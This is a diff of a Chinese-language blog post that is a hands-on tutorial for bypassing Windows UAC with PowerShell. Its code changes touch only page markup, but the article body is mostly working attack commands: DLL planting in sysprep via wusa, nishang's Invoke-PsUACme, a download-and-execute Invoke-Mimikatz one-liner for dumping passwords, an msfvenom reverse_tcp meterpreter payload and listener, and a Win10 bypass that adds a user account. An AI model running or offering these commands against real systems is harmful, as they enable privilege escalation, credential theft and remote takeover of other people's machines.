@@ -1,4 +1,21 @@
-<!DOCTYPE html><html class="theme-next pisces use-motion" lang="zh-CN"><head><meta name="generator" content="Hexo 3.9.0">
+<!DOCTYPE html>
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+<html class="theme-next pisces use-motion" lang="zh-CN">
+<head><meta name="generator" content="Hexo 3.9.0">
   <meta charset="UTF-8">
 <meta http-equiv="X-UA-Compatible" content="IE=edge">
 <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
@@ -68,7 +85,7 @@
     back2top_sidebar: false,
     fancybox: true,
     fastclick: true,
-    lazyload: true,
+    lazyload: false,
     tabs: true,
     motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
     algolia: {
@@ -92,24 +109,24 @@
 <meta property="og:type" content="article">
 <meta property="og:title" content="使用Powershell Bypass UAC">
 <meta property="og:url" content="https://evi1cg.github.io/archives/Powershell_Bypass_UAC.html">
-<meta property="og:site_name" content="Evi1cg's blog">
+<meta property="og:site_name" content="Evi1cg&#39;s blog">
 <meta property="og:description" content="0x00 简介UAC(User Account Control，用户帐户控制)是微软为提高系统安全而在Windows Vista中引入的新技术，它要求用户在执行可能会影响计算机运行的操作或执行更改影响其他用户的设置的操作之前，提供权限或管理员‌密码。也就是说一旦用户允许启动的应用程序通过UAC验证，那么这个程序也就有了管理员权限。许多情况下，我们获取了反弹的shell但是由于UAC这个烦人的东西并">
 <meta property="og:locale" content="zh-CN">
-<meta property="og:image" content="https://evi1cg.github.io/images/loading.svg">
-<meta property="og:image" content="https://evi1cg.github.io/images/loading.svg">
-<meta property="og:image" content="https://evi1cg.github.io/images/loading.svg">
-<meta property="og:image" content="https://evi1cg.github.io/images/loading.svg">
-<meta property="og:image" content="https://evi1cg.github.io/images/loading.svg">
-<meta property="og:image" content="https://evi1cg.github.io/images/loading.svg">
-<meta property="og:image" content="https://evi1cg.github.io/images/loading.svg">
-<meta property="og:image" content="https://evi1cg.github.io/images/loading.svg">
-<meta property="og:image" content="https://evi1cg.github.io/images/loading.svg">
-<meta property="og:image" content="https://evi1cg.github.io/images/loading.svg">
+<meta property="og:image" content="https://evi1cg.github.io/usr/uploads/2015/10/2716591275.png">
+<meta property="og:image" content="https://evi1cg.github.io/usr/uploads/2015/10/3310715108.png">
+<meta property="og:image" content="https://evi1cg.github.io/usr/uploads/2015/10/1851453536.png">
+<meta property="og:image" content="https://evi1cg.github.io/usr/uploads/2015/10/3125961552.png">
+<meta property="og:image" content="https://evi1cg.github.io/usr/uploads/2015/10/185146731.png">
+<meta property="og:image" content="https://evi1cg.github.io/usr/uploads/2015/10/884387556.png">
+<meta property="og:image" content="https://evi1cg.github.io/usr/uploads/2015/10/87909438.png">
+<meta property="og:image" content="https://evi1cg.github.io/usr/uploads/2015/10/541348713.png">
+<meta property="og:image" content="https://evi1cg.github.io/usr/uploads/2015/10/671982911.png">
+<meta property="og:image" content="https://evi1cg.github.io/usr/uploads/2015/10/2984642320.png">
 <meta property="og:updated_time" content="2019-01-15T05:43:36.771Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="使用Powershell Bypass UAC">
 <meta name="twitter:description" content="0x00 简介UAC(User Account Control，用户帐户控制)是微软为提高系统安全而在Windows Vista中引入的新技术，它要求用户在执行可能会影响计算机运行的操作或执行更改影响其他用户的设置的操作之前，提供权限或管理员‌密码。也就是说一旦用户允许启动的应用程序通过UAC验证，那么这个程序也就有了管理员权限。许多情况下，我们获取了反弹的shell但是由于UAC这个烦人的东西并">
-<meta name="twitter:image" content="https://evi1cg.github.io/images/loading.svg">
+<meta name="twitter:image" content="https://evi1cg.github.io/usr/uploads/2015/10/2716591275.png">
 
 
 
@@ -489,7 +506,7 @@
       
 
       
-        <meta name="generator" content="Hexo 3.9.0"><h2 id="0x00-简介"><a href="#0x00-简介" class="headerlink" title="0x00 简介"></a>0x00 简介</h2><p>UAC(User Account Control，用户帐户控制)是微软为提高系统安全而在Windows Vista中引入的新技术，它要求用户在执行可能会影响计算机运行的操作或执行更改影响其他用户的设置的操作之前，提供权限或管理员‌密码。也就是说一旦用户允许启动的应用程序通过UAC验证，那么这个程序也就有了管理员权限。许多情况下，我们获取了反弹的shell但是由于UAC这个烦人的东西并不能获取最高的权限，今天主要介绍使用powershell来bypass uac从而获取更高的权限。</p>
+        <h2 id="0x00-简介"><a href="#0x00-简介" class="headerlink" title="0x00 简介"></a>0x00 简介</h2><p>UAC(User Account Control，用户帐户控制)是微软为提高系统安全而在Windows Vista中引入的新技术，它要求用户在执行可能会影响计算机运行的操作或执行更改影响其他用户的设置的操作之前，提供权限或管理员‌密码。也就是说一旦用户允许启动的应用程序通过UAC验证，那么这个程序也就有了管理员权限。许多情况下，我们获取了反弹的shell但是由于UAC这个烦人的东西并不能获取最高的权限，今天主要介绍使用powershell来bypass uac从而获取更高的权限。</p>
 <h2 id="0x01-Bypass-UAC"><a href="#0x01-Bypass-UAC" class="headerlink" title="0x01 Bypass UAC"></a>0x01 Bypass UAC</h2><p>通常绕过UAC的方法如下：</p>
 <ul>
 <li>step1: 复制DLL文件到C:\Windows\System32\sysprep目录，DLL的名字取决于操作系统版本，比如Windows7为CRYPTBASE.dll，Windows8为shcore.dll。</li>
@@ -497,7 +514,7 @@
 </ul>
 <a id="more"></a>
 <p>具体dll名及利用exe如下表：</p>
-<p></p><div class="progress-images" style="width:1368px"><div class="progress-images--placeholder" style="padding-bottom: 62.865497076023395%;"></div><img src="/images/loading.svg" alt="EDDA46A0-E2D7-47B7-9018-857B0D60CCDC.png" class="progress-images--original" data-original="https://evi1cg.github.io/usr/uploads/2015/10/2716591275.png" data-thumb="/images/thumb/a2f88fcd7321423196d9903dbf2a8b66.png"></div><p></p>
+<p><img src="https://evi1cg.github.io/usr/uploads/2015/10/2716591275.png" alt="EDDA46A0-E2D7-47B7-9018-857B0D60CCDC.png"></p>
 <p>总结了一下突破Windows UAC的方式主要有以下几种：</p>
 <ul>
 <li>1、使用IFileOperation COM接口；</li>
@@ -507,37 +524,37 @@
 <li>5、直接提权过UAC;</li>
 <li>6、MS15-076(感觉上也可以用到) <a href="https://github.com/monoxgas/Trebuchet" target="_blank" rel="noopener">POC</a>。</li>
 </ul>
-<p>部分方式需要我们将DLL文件拷贝到相应的目录，这里拿Sysprep来做测试，要往这个目录拷贝文件需要管理员的权限，直接copy是不可以的,本文介绍的脚本使用了第二种方式，下面是一个测试。<br>使用copy:<br></p><figure class="highlight taggerscript"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:<span class="symbol">\U</span>AC>copy evil.dll C:<span class="symbol">\W</span>indows<span class="symbol">\S</span>ystem32<span class="symbol">\s</span>ysprep\</span><br></pre></td></tr></tbody></table></figure><p></p>
-<p></p><div class="progress-images" style="width:770px"><div class="progress-images--placeholder" style="padding-bottom: 58.18181818181818%;"></div><img src="/images/loading.svg" alt="1444279395999.png" class="progress-images--original" data-original="https://evi1cg.github.io/usr/uploads/2015/10/3310715108.png" data-thumb="/images/thumb/ed199ebad214715aca481402dc46820d.png"></div><p></p>
-<p>使用Wusa.exe：<br></p><figure class="highlight taggerscript"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">C:<span class="symbol">\></span> makecab C:<span class="symbol">\u</span>ac<span class="symbol">\e</span>vil.dll C:<span class="symbol">\u</span>ac<span class="symbol">\u</span>ac.cab</span><br><span class="line">C:<span class="symbol">\></span> wusa C:<span class="symbol">\u</span>ac<span class="symbol">\u</span>ac.cab /extract:C:<span class="symbol">\W</span>indows<span class="symbol">\S</span>ystem32<span class="symbol">\s</span>ysprep\</span><br></pre></td></tr></tbody></table></figure><p></p>
-<p></p><div class="progress-images" style="width:783px"><div class="progress-images--placeholder" style="padding-bottom: 59.00383141762452%;"></div><img src="/images/loading.svg" alt="1444279504342.png" class="progress-images--original" data-original="https://evi1cg.github.io/usr/uploads/2015/10/1851453536.png" data-thumb="/images/thumb/e285021f0ff773824030adedefd84786.png"></div><p></p>
+<p>部分方式需要我们将DLL文件拷贝到相应的目录，这里拿Sysprep来做测试，要往这个目录拷贝文件需要管理员的权限，直接copy是不可以的,本文介绍的脚本使用了第二种方式，下面是一个测试。<br>使用copy:<br><figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:<span class="symbol">\U</span>AC&gt;copy evil.dll C:<span class="symbol">\W</span>indows<span class="symbol">\S</span>ystem32<span class="symbol">\s</span>ysprep\</span><br></pre></td></tr></table></figure></p>
+<p><img src="https://evi1cg.github.io/usr/uploads/2015/10/3310715108.png" alt="1444279395999.png"></p>
+<p>使用Wusa.exe：<br><figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">C:<span class="symbol">\&gt;</span> makecab C:<span class="symbol">\u</span>ac<span class="symbol">\e</span>vil.dll C:<span class="symbol">\u</span>ac<span class="symbol">\u</span>ac.cab</span><br><span class="line">C:<span class="symbol">\&gt;</span> wusa C:<span class="symbol">\u</span>ac<span class="symbol">\u</span>ac.cab /extract:C:<span class="symbol">\W</span>indows<span class="symbol">\S</span>ystem32<span class="symbol">\s</span>ysprep\</span><br></pre></td></tr></table></figure></p>
+<p><img src="https://evi1cg.github.io/usr/uploads/2015/10/1851453536.png" alt="1444279504342.png"></p>
 <p>可以看到使用wusa成功拷贝。</p>
-<h2 id="0x02-Invoke-PsUACme"><a href="#0x02-Invoke-PsUACme" class="headerlink" title="0x02 Invoke-PsUACme"></a>0x02 Invoke-PsUACme</h2><p><a href="https://raw.githubusercontent.com/samratashok/nishang/master/Escalation/Invoke-PsUACme.ps1" target="_blank" rel="noopener">Invoke-PsUACme</a> 是nishang的一个脚本，该脚本使用了列表中的几个方式来进行bypass UAC，目前支持Win7 ，Win8,由于Win10的wusa extract选项不在受支持，所以此脚本并不适用于Win10。<br>该脚本的所使用的DLL来自于开源项目<a href="https://github.com/hfiref0x/UACME" target="_blank" rel="noopener">UACME</a>。nishang作者对代码进行了一下简单地修改，这里就不详细说了。<br>这里介绍一下脚本的使用,加载脚本：<br></p><figure class="highlight livescript"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PS C:<span class="string">\UAC></span> . .<span class="string">\Invoke-PsUACme.ps1</span></span><br></pre></td></tr></tbody></table></figure><p></p>
-<p>查看说明：<br></p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PS C:\UAC> <span class="built_in">help</span> Invoke-PsUACme</span><br></pre></td></tr></tbody></table></figure><p></p>
+<h2 id="0x02-Invoke-PsUACme"><a href="#0x02-Invoke-PsUACme" class="headerlink" title="0x02 Invoke-PsUACme"></a>0x02 Invoke-PsUACme</h2><p><a href="https://raw.githubusercontent.com/samratashok/nishang/master/Escalation/Invoke-PsUACme.ps1" target="_blank" rel="noopener">Invoke-PsUACme</a> 是nishang的一个脚本，该脚本使用了列表中的几个方式来进行bypass UAC，目前支持Win7 ，Win8,由于Win10的wusa extract选项不在受支持，所以此脚本并不适用于Win10。<br>该脚本的所使用的DLL来自于开源项目<a href="https://github.com/hfiref0x/UACME" target="_blank" rel="noopener">UACME</a>。nishang作者对代码进行了一下简单地修改，这里就不详细说了。<br>这里介绍一下脚本的使用,加载脚本：<br><figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PS C:<span class="string">\UAC&gt;</span> . .<span class="string">\Invoke-PsUACme.ps1</span></span><br></pre></td></tr></table></figure></p>
+<p>查看说明：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PS C:\UAC&gt; <span class="built_in">help</span> Invoke-PsUACme</span><br></pre></td></tr></table></figure></p>
 <blockquote>
 <p>主要参数说明：<strong>Payload</strong>为自定义要执行的程序；<strong>method</strong>为bypass的方式，包括Sysprep，OOBE，ActionQueue等几种；<strong>Verbose</strong>显示程序运行过程；<strong>CustomDLL64,CustomDLL32</strong>可以指定自定义DLL。</p>
 </blockquote>
-<p>执行：<br></p><figure class="highlight mathematica"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PS <span class="keyword">C</span>:\UAC> Invoke-PsUACme -<span class="keyword">Verbose</span></span><br></pre></td></tr></tbody></table></figure><p></p>
-<p></p><div class="progress-images" style="width:648px"><div class="progress-images--placeholder" style="padding-bottom: 74.53703703703704%;"></div><img src="/images/loading.svg" alt="1444280708707.png" class="progress-images--original" data-original="https://evi1cg.github.io/usr/uploads/2015/10/3125961552.png" data-thumb="/images/thumb/8fe6ba10a4764b687bacef085a3ef1a1.png"></div><p></p>
-<p>使用Sysprep执行payload:<br></p><figure class="highlight oxygene"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PS C:\UAC> Invoke-PsUACme -<span class="function"><span class="keyword">method</span> <span class="title">sysprep</span> -<span class="title">Payload</span> "<span class="title">cmd</span>.<span class="title">exe</span>"</span></span><br></pre></td></tr></tbody></table></figure><p></p>
-<p></p><div class="progress-images" style="width:669px"><div class="progress-images--placeholder" style="padding-bottom: 45.889387144992526%;"></div><img src="/images/loading.svg" alt="1444280844406.png" class="progress-images--original" data-original="https://evi1cg.github.io/usr/uploads/2015/10/185146731.png" data-thumb="/images/thumb/b380c3da9879b0d3f403d20dcb118d38.png"></div><p></p>
+<p>执行：<br><figure class="highlight mathematica"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PS <span class="keyword">C</span>:\UAC&gt; Invoke-PsUACme -<span class="keyword">Verbose</span></span><br></pre></td></tr></table></figure></p>
+<p><img src="https://evi1cg.github.io/usr/uploads/2015/10/3125961552.png" alt="1444280708707.png"></p>
+<p>使用Sysprep执行payload:<br><figure class="highlight oxygene"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PS C:\UAC&gt; Invoke-PsUACme -<span class="function"><span class="keyword">method</span> <span class="title">sysprep</span> -<span class="title">Payload</span> "<span class="title">cmd</span>.<span class="title">exe</span>"</span></span><br></pre></td></tr></table></figure></p>
+<p><img src="https://evi1cg.github.io/usr/uploads/2015/10/185146731.png" alt="1444280844406.png"></p>
 <p><code>执行某个自定义程序需要在payload出填写绝对路径</code>。</p>
-<p>自定义DLL：<br></p><figure class="highlight taggerscript"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PS C:<span class="symbol">\></span> Invoke-PSUACMe -CustomDll64 C:<span class="symbol">\t</span>est<span class="symbol">\t</span>est64.dll -CustomDll32 C:<span class="symbol">\t</span>est<span class="symbol">\t</span>est32.dll -Verbose"</span><br></pre></td></tr></tbody></table></figure><p></p>
-<h2 id="0x03-能做什么"><a href="#0x03-能做什么" class="headerlink" title="0x03 能做什么"></a>0x03 能做什么</h2><p>1）通过bypass UAC我们可以通过普通的cmd抓到管理员密码。<br>普通cmd运行在线抓明文：<br></p><figure class="highlight less"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">powershell</span> <span class="selector-tag">IEX</span> (New-Object Net.WebClient)<span class="selector-class">.DownloadString</span>(<span class="string">'https://raw.githubusercontent.com/mattifestation/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1'</span>); <span class="selector-tag">Invoke-Mimikatz</span></span><br></pre></td></tr></tbody></table></figure><p></p>
-<p></p><div class="progress-images" style="width:674px"><div class="progress-images--placeholder" style="padding-bottom: 52.52225519287834%;"></div><img src="/images/loading.svg" alt="1444282116870.png" class="progress-images--original" data-original="https://evi1cg.github.io/usr/uploads/2015/10/884387556.png" data-thumb="/images/thumb/948fa35bd95fbe35f13ff51435fe8d71.png"></div><p></p>
-<p>bypass UAC以后：<br></p><figure class="highlight livescript"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">PS C:<span class="string">\UAC></span> . .<span class="string">\Invoke-PsUACme.ps1</span></span><br><span class="line">PS C:<span class="string">\UAC></span> Invoke-PsUACme -Payload <span class="string">"powershell -noexit IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/mattifestation/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1'); Invoke-Mimikatz"</span></span><br></pre></td></tr></tbody></table></figure><p></p>
-<p></p><div class="progress-images" style="width:673px"><div class="progress-images--placeholder" style="padding-bottom: 61.2184249628529%;"></div><img src="/images/loading.svg" alt="1444282332596.png" class="progress-images--original" data-original="https://evi1cg.github.io/usr/uploads/2015/10/87909438.png" data-thumb="/images/thumb/a94a8e378fe48174c3fe0e9a720ce5b0.png"></div><p></p>
-<p>2) 让meterpreter获得更高的权限。<br>生成payload:<br></p><figure class="highlight stylus"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">☁  ~  sudo msfvenom -<span class="selector-tag">p</span> windows/meterpreter/reverse_tcp LHOST=x<span class="selector-class">.x</span><span class="selector-class">.x</span><span class="selector-class">.x</span> LPORT=<span class="number">8889</span> -f psh-reflection</span><br></pre></td></tr></tbody></table></figure><p></p>
+<p>自定义DLL：<br><figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PS C:<span class="symbol">\&gt;</span> Invoke-PSUACMe -CustomDll64 C:<span class="symbol">\t</span>est<span class="symbol">\t</span>est64.dll -CustomDll32 C:<span class="symbol">\t</span>est<span class="symbol">\t</span>est32.dll -Verbose"</span><br></pre></td></tr></table></figure></p>
+<h2 id="0x03-能做什么"><a href="#0x03-能做什么" class="headerlink" title="0x03 能做什么"></a>0x03 能做什么</h2><p>1）通过bypass UAC我们可以通过普通的cmd抓到管理员密码。<br>普通cmd运行在线抓明文：<br><figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">powershell</span> <span class="selector-tag">IEX</span> (New-Object Net.WebClient)<span class="selector-class">.DownloadString</span>(<span class="string">'https://raw.githubusercontent.com/mattifestation/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1'</span>); <span class="selector-tag">Invoke-Mimikatz</span></span><br></pre></td></tr></table></figure></p>
+<p><img src="https://evi1cg.github.io/usr/uploads/2015/10/884387556.png" alt="1444282116870.png"></p>
+<p>bypass UAC以后：<br><figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">PS C:<span class="string">\UAC&gt;</span> . .<span class="string">\Invoke-PsUACme.ps1</span></span><br><span class="line">PS C:<span class="string">\UAC&gt;</span> Invoke-PsUACme -Payload <span class="string">"powershell -noexit IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/mattifestation/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1'); Invoke-Mimikatz"</span></span><br></pre></td></tr></table></figure></p>
+<p><img src="https://evi1cg.github.io/usr/uploads/2015/10/87909438.png" alt="1444282332596.png"></p>
+<p>2) 让meterpreter获得更高的权限。<br>生成payload:<br><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">☁  ~  sudo msfvenom -<span class="selector-tag">p</span> windows/meterpreter/reverse_tcp LHOST=x<span class="selector-class">.x</span><span class="selector-class">.x</span><span class="selector-class">.x</span> LPORT=<span class="number">8889</span> -f psh-reflection</span><br></pre></td></tr></table></figure></p>
 <p>将输出文件保存为psh.ps1</p>
-<p>msf开启监听：<br></p><figure class="highlight gams"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">msf > use exploit/multi/handler</span><br><span class="line">msf exploit(handler) > <span class="keyword">set</span> payload <span class="comment">windows</span>/meterpreter/<span class="comment">reverse_tcp</span></span><br><span class="line">payload <span class="comment">=> windows</span>/meterpreter/<span class="comment">reverse_tcp</span></span><br><span class="line">msf <span class="comment">exploit(handler) > set lhost x.x.x.x</span></span><br><span class="line">lhost <span class="comment">=> x.x.x.x</span></span><br><span class="line">msf <span class="comment">exploit(handler) > set lport 8889</span></span><br><span class="line">lport <span class="comment">=> 8889</span></span><br><span class="line">msf <span class="comment">exploit(handler) > exploit</span></span><br></pre></td></tr></tbody></table></figure><p></p>
+<p>msf开启监听：<br><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">msf &gt; use exploit/multi/handler</span><br><span class="line">msf exploit(handler) &gt; <span class="keyword">set</span> payload <span class="comment">windows</span>/meterpreter/<span class="comment">reverse_tcp</span></span><br><span class="line">payload <span class="comment">=&gt; windows</span>/meterpreter/<span class="comment">reverse_tcp</span></span><br><span class="line">msf <span class="comment">exploit(handler) &gt; set lhost x.x.x.x</span></span><br><span class="line">lhost <span class="comment">=&gt; x.x.x.x</span></span><br><span class="line">msf <span class="comment">exploit(handler) &gt; set lport 8889</span></span><br><span class="line">lport <span class="comment">=&gt; 8889</span></span><br><span class="line">msf <span class="comment">exploit(handler) &gt; exploit</span></span><br></pre></td></tr></table></figure></p>
 <p>普通cmd执行:</p>
-<p></p><div class="progress-images" style="width:1198px"><div class="progress-images--placeholder" style="padding-bottom: 23.706176961602672%;"></div><img src="/images/loading.svg" alt="1444283744791.png" class="progress-images--original" data-original="https://evi1cg.github.io/usr/uploads/2015/10/541348713.png" data-thumb="/images/thumb/637958abcb97c283ebbd4af0deb1fa3b.png"></div><p></p>
+<p><img src="https://evi1cg.github.io/usr/uploads/2015/10/541348713.png" alt="1444283744791.png"></p>
 <p>bypass UAC 以后执行：</p>
-<p></p><div class="progress-images" style="width:1340px"><div class="progress-images--placeholder" style="padding-bottom: 25.671641791044777%;"></div><img src="/images/loading.svg" alt="1444284083158.png" class="progress-images--original" data-original="https://evi1cg.github.io/usr/uploads/2015/10/671982911.png" data-thumb="/images/thumb/885f5e2bed22f52e9d3b3c68d423457f.png"></div><p></p>
+<p><img src="https://evi1cg.github.io/usr/uploads/2015/10/671982911.png" alt="1444284083158.png"></p>
 <h2 id="0x04-Win10-Bypass-UAC"><a href="#0x04-Win10-Bypass-UAC" class="headerlink" title="0x04 Win10 Bypass UAC"></a>0x04 Win10 Bypass UAC</h2><p>我修改了一个使用远程注入方式Bypass UAC的powersell脚本以支持Win10,脚本地址：<a href="https://raw.githubusercontent.com/Ridter/Pentest/master/powershell/MyShell/invoke-BypassUAC.ps1" target="_blank" rel="noopener">戳我</a></p>
-<p>使用方式与nishang不同，并没有回显，使用win10进行测试：<br></p><figure class="highlight smali"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">PS F:\drops\UAC> . .\invoke-BypassUAC.ps1</span><br><span class="line">PS F:\drops\UAC><span class="built_in"> invoke-BypassUAC </span>-Command 'net user 1 <span class="string">"Password123!"</span> /add'</span><br></pre></td></tr></tbody></table></figure><p></p>
-<p></p><div class="progress-images" style="width:1066px"><div class="progress-images--placeholder" style="padding-bottom: 44.652908067542214%;"></div><img src="/images/loading.svg" alt="1444287918484.png" class="progress-images--original" data-original="https://evi1cg.github.io/usr/uploads/2015/10/2984642320.png" data-thumb="/images/thumb/5ef2da16afdad23b70630c6445564abe.png"></div><p></p>
-<p>除了上面的脚本，<a href="https://github.com/hfiref0x/UACME" target="_blank" rel="noopener">UACME</a>也很好的支持win10,使用方式为：<br></p><figure class="highlight llvm"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">akag<span class="keyword">i32</span>.exe <span class="number">1</span></span><br><span class="line">akag<span class="keyword">i64</span>.exe <span class="number">3</span></span><br><span class="line">akag<span class="keyword">i32</span> <span class="number">1</span> <span class="keyword">c</span>:\windows\system<span class="number">32</span>\calc.exe</span><br><span class="line">akag<span class="keyword">i64</span> <span class="number">3</span> <span class="keyword">c</span>:\windows\system<span class="number">32</span>\cmd.exe</span><br></pre></td></tr></tbody></table></figure><p></p>
+<p>使用方式与nishang不同，并没有回显，使用win10进行测试：<br><figure class="highlight smali"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">PS F:\drops\UAC&gt; . .\invoke-BypassUAC.ps1</span><br><span class="line">PS F:\drops\UAC&gt;<span class="built_in"> invoke-BypassUAC </span>-Command 'net user 1 <span class="string">"Password123!"</span> /add'</span><br></pre></td></tr></table></figure></p>
+<p><img src="https://evi1cg.github.io/usr/uploads/2015/10/2984642320.png" alt="1444287918484.png"></p>
+<p>除了上面的脚本，<a href="https://github.com/hfiref0x/UACME" target="_blank" rel="noopener">UACME</a>也很好的支持win10,使用方式为：<br><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">akag<span class="keyword">i32</span>.exe <span class="number">1</span></span><br><span class="line">akag<span class="keyword">i64</span>.exe <span class="number">3</span></span><br><span class="line">akag<span class="keyword">i32</span> <span class="number">1</span> <span class="keyword">c</span>:\windows\system<span class="number">32</span>\calc.exe</span><br><span class="line">akag<span class="keyword">i64</span> <span class="number">3</span> <span class="keyword">c</span>:\windows\system<span class="number">32</span>\cmd.exe</span><br></pre></td></tr></table></figure></p>
 <h2 id="0x05-小结"><a href="#0x05-小结" class="headerlink" title="0x05 小结"></a>0x05 小结</h2><p>绕过UAC能获取更高的权限，你还发愁抓密码么？</p>
 
       
@@ -894,7 +911,7 @@
                   
                     
                   
-                  <a href="https://github.com/Ridter" title="GitHub → https://github.com/Ridter" rel="noopener" target="_blank"><i class="fa fa-fw fa-github"></i>GitHub</a>
+                  <a href="https://github.com/Ridter" title="GitHub &rarr; https://github.com/Ridter" rel="noopener" target="_blank"><i class="fa fa-fw fa-github"></i>GitHub</a>
                 </span>
               
                 <span class="links-of-author-item">
@@ -905,7 +922,7 @@
                   
                     
                   
-                  <a href="https://twitter.com/Evi1cg" title="Twitter → https://twitter.com/Evi1cg" rel="noopener" target="_blank"><i class="fa fa-fw fa-twitter"></i>Twitter</a>
+                  <a href="https://twitter.com/Evi1cg" title="Twitter &rarr; https://twitter.com/Evi1cg" rel="noopener" target="_blank"><i class="fa fa-fw fa-twitter"></i>Twitter</a>
                 </span>
               
                 <span class="links-of-author-item">
@@ -916,7 +933,7 @@
                   
                     
                   
-                  <a href="https://weibo.com/Ridter" title="微博 → https://weibo.com/Ridter" rel="noopener" target="_blank"><i class="fa fa-fw fa-weibo"></i>微博</a>
+                  <a href="https://weibo.com/Ridter" title="微博 &rarr; https://weibo.com/Ridter" rel="noopener" target="_blank"><i class="fa fa-fw fa-weibo"></i>微博</a>
                 </span>
               
                 <span class="links-of-author-item">
@@ -927,7 +944,7 @@
                   
                     
                   
-                  <a href="mailto:zuotonghk@gmail.com" title="E-Mail → mailto:zuotonghk@gmail.com" rel="noopener" target="_blank"><i class="fa fa-fw fa-envelope"></i>E-Mail</a>
+                  <a href="mailto:zuotonghk@gmail.com" title="E-Mail &rarr; mailto:zuotonghk@gmail.com" rel="noopener" target="_blank"><i class="fa fa-fw fa-envelope"></i>E-Mail</a>
                 </span>
               
             </div>
@@ -979,7 +996,7 @@
 
     <footer id="footer" class="footer">
       <div class="footer-inner">
-        <div class="copyright">© 2015 – <span itemprop="copyrightYear">2019</span>
+        <div class="copyright">&copy; 2015 – <span itemprop="copyrightYear">2019</span>
   <span class="with-love" id="animate">
     <i class="fa fa-heart"></i>
   </span>
@@ -1041,8 +1058,6 @@
 
 
 
-  
-
 
 
 
@@ -1071,9 +1086,6 @@
 
   
   <script src="//cdn.jsdelivr.net/npm/fastclick@1/lib/fastclick.min.js"></script>
-
-  
-  <script src="//cdn.jsdelivr.net/npm/jquery-lazyload@1/jquery.lazyload.min.js"></script>
 
   
   <script src="//cdn.jsdelivr.net/npm/velocity-animate@1/velocity.min.js"></script>
@@ -1517,11 +1529,6 @@
   
 
   
-  
-  
-  <script src="/lib/pangu/dist/pangu.min.js?v=3.3"></script>
-  <script>pangu.spacingPage();</script>
-
 
   
 
@@ -1661,6 +1668,5 @@
   <script>
   $("body").backstretch("https://blogpics-1251691280.file.myqcloud.com/imgs/20190121234042.jpg");
   </script>
-<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"log":false,"model":{"jsonPath":"/live2dw/assets/z16.model.json"},"display":{"position":"left","width":80,"height":120,"hOffset":30,"vOffset":0},"mobile":{"show":true}});</script>
-
-<script type="text/javascript" charset="utf-8" src="/js/lazyload-plugin/lazyload.intersectionObserver.min.js"></script></body></html>
